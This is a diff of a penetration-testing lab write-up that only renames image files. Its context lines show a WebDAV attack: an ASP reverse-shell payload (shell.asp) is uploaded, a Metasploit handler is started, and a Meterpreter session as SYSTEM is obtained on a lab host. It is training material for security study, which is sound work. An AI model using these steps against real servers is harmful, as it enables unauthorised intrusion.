@@ -329,7 +329,7 @@ Uploading shell.asp to `/webdav/shell.asp':
 Progress: [=============================>] 100.0% of 354 bytes succeeded.
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Before executing the `shell.asp`, _setup a **listener**/**handler** that will receive the reverse connection from the target and send the stage that provides with a `meterpreter` session when executed_.
 
@@ -352,12 +352,12 @@ msf6 exploit(multi/handler) > run
 
 * The listener (reverse TCP handler) starts listening and waits for a connection from the actual `shell.asp` payload
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Open the `http://10.4.18.218/webdav` link in the browser and execute `shell.asp` file
 * The **Meterpreter** session will be opened and successfully gained access to the target system
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Confirm this with `sysinfo`
 
@@ -379,7 +379,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > 📌 No privilege escalation needed since the user is `NT AUTHORITY\SYSTEM`
 
